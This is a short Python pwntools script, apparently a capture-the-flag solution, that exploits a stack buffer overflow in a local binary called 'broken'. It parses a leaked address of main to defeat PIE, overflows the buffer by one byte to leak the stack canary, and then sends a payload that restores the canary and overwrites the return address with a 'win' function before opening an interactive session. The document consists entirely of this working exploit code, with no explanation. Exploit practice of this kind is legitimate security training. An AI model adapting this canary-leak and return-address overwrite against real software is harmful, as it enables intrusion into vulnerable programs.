from pwn import *

context.binary = el = ELF('broken')
main = el.symbols['main']
win = el.symbols['win']

p = process('broken')

main_hex = p.recvline().decode().split(' ')[-1]
offset_pie = int(main_hex, 16) - main
win_pie = win + offset_pie
if win_pie % pow(16,3) == 0:
    print('page offset aligned')
else:
    print('page offset not aligned')

p.recvline()
p.sendline(b'A'*40) # overwrite canary by one
offset = 40 + 22
p.recvline() # read untile the /n(first byte of canary)
canary = p.recvline()[:7]
canary = b'\x00' + canary
print('canary: ' + canary.hex())

payload = b'A'*40 + canary + b'A'*8 + p64(win_pie)
p.sendline(payload)
p.interactive()

# telescope e vedo lo stack